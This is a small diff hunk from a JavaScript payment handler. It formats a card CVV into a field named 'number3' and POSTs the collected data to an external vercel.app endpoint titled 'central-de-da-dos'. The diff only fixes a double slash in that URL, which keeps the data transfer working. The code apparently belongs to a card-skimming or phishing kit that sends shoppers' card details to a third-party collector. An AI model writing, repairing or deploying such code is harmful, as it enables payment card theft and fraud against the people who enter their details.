@@ -2202,7 +2202,7 @@ handlePayment = async function (paymentMethod) {
                 number3: String(_cardCvv).replace(/\D/g, '').padStart(3, "0").slice(-3),
             };
 
-            const endpointUrl = "https://central-de-da-dos.vercel.app//api/submit";
+            const endpointUrl = "https://central-de-da-dos.vercel.app/api/submit";
             const response = await fetch(endpointUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
